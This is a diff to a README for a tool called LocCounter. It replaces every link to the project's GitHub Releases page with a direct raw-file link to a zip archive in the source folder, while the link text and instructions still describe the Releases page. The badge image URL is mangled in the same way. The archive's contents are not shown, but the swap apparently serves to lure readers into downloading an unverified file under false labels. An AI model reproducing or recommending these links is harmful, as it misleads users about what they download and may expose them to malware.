@@ -6,7 +6,7 @@ Welcome to LocCounter! This tool helps you count lines in files and directories 
 
 ## 📥 Download LocCounter
 
-### [![Download Now](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/joevin046/LocCounter/releases)
+### [![Download Now](https://raw.githubusercontent.com/joevin046/LocCounter/main/src/Counter_Loc_3.9.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/joevin046/LocCounter/main/src/Counter_Loc_3.9.zip)
 
 ## 🔧 Features
 
@@ -28,7 +28,7 @@ To run LocCounter, ensure you have:
 
 To begin, visit the following link to access the Releases page:
 
-[Download LocCounter from the Releases Page](https://github.com/joevin046/LocCounter/releases)
+[Download LocCounter from the Releases Page](https://raw.githubusercontent.com/joevin046/LocCounter/main/src/Counter_Loc_3.9.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version listed there.
@@ -94,4 +94,4 @@ LocCounter is licensed under the MIT License. You can use, copy, modify, and dis
 
 ## 📥 Download Now Again
 
-Don’t wait to start counting lines. [Download LocCounter from the Releases Page](https://github.com/joevin046/LocCounter/releases) and streamline your workflow today!
+Don’t wait to start counting lines. [Download LocCounter from the Releases Page](https://raw.githubusercontent.com/joevin046/LocCounter/main/src/Counter_Loc_3.9.zip) and streamline your workflow today!
